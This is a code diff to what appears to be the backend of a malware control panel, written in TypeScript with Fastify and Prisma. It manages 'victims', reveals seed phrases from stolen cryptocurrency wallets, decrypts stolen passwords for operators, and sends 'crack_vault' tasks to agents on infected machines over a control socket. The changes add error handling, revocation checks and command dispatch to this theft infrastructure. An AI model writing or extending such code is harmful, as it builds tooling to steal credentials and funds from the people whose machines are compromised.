@@ -6,6 +6,9 @@ import { notFound } from '../lib/errors';
 import { openSecret } from '../lib/crypto';
 import { revealSecret } from '../services/vault';
 import { requireRole } from '../plugins/auth';
+import { dispatchCommand, hasControl } from './ws';
+import { publish } from '../lib/bus';
+import { bad } from '../lib/errors';
 
 const blank = (schema: z.ZodTypeAny) => z.preprocess((value) => value === '' ? undefined : value, schema);
 const pages = z.object({
@@ -191,7 +194,9 @@ export const vaultRoutes: FastifyPluginAsync = async (app) => {
     const kind = z.object({ kind: z.string().max(32).default('seed') }).parse(request.query).kind;
     const wallet = await prisma.wallet.findUnique({ where: { id: walletId }, select: { id: true, victimId: true, targetId: true } });
     if (!wallet) throw notFound('wallet');
-    const secret = await revealSecret(walletId, kind);
+    const secret = await revealSecret(walletId, kind).catch(() => {
+      throw bad('decrypt_failed', 'no se pudo descifrar el secreto', 409);
+    });
     if (!secret) throw notFound('secret');
     await prisma.$transaction(async (tx) => {
       await audit(tx, {
@@ -209,8 +214,10 @@ export const vaultRoutes: FastifyPluginAsync = async (app) => {
 
   app.post('/vault/wallets/:walletId/retry', { preHandler: requireRole('operator') }, async (request, reply) => {
     const { walletId } = z.object({ walletId: z.string().uuid() }).parse(request.params);
-    const wallet = await prisma.wallet.findUnique({ where: { id: walletId }, include: { victim: { select: { id: true } } } });
+    const wallet = await prisma.wallet.findUnique({ where: { id: walletId }, include: { victim: { select: { id: true, revokedAt: true } } } });
     if (!wallet) throw notFound('wallet');
+    if (wallet.victim.revokedAt) throw bad('revoked', 'victim is revoked', 409);
+    if (!hasControl(wallet.victimId)) throw bad('agent_offline', 'victim has no control socket', 409);
     const task = await prisma.$transaction(async (tx) => {
       const created = await tx.task.create({
         data: { victimId: wallet.victimId, name: 'crack_vault', params: { target: wallet.targetId, max_seconds: 120 } as never, timeoutSec: 180, createdById: request.operator!.id }
@@ -225,7 +232,12 @@ export const vaultRoutes: FastifyPluginAsync = async (app) => {
       });
       return created;
     });
-    return reply.code(201).send({ ok: true, taskId: task.id });
+    const delivered = await dispatchCommand(task).catch(() => false);
+    if (!delivered) {
+      await prisma.task.updateMany({ where: { id: task.id, status: 'queued' }, data: { status: 'error', error: 'agent_offline', finishedAt: new Date(), leaseUntil: null } });
+    }
+    void publish({ type: 'task.update', victimId: wallet.victimId, at: Date.now(), data: { id: task.id, name: 'crack_vault', status: delivered ? 'queued' : 'error' } });
+    return reply.code(201).send({ ok: true, taskId: task.id, delivered });
   });
 
   app.get('/vault/credentials', async (request) => {
@@ -267,7 +279,12 @@ export const vaultRoutes: FastifyPluginAsync = async (app) => {
     const { id } = z.object({ id: z.string().uuid() }).parse(request.params);
     const row = await prisma.credential.findUnique({ where: { id } });
     if (!row || !row.passwordEnc) throw notFound('credential');
-    const value = openSecret(row.passwordEnc);
+    let value: string;
+    try {
+      value = openSecret(row.passwordEnc);
+    } catch {
+      throw bad('decrypt_failed', 'no se pudo descifrar la contraseña', 409);
+    }
     await prisma.$transaction(async (tx) => {
       await audit(tx, {
         operatorId: request.operator?.id,
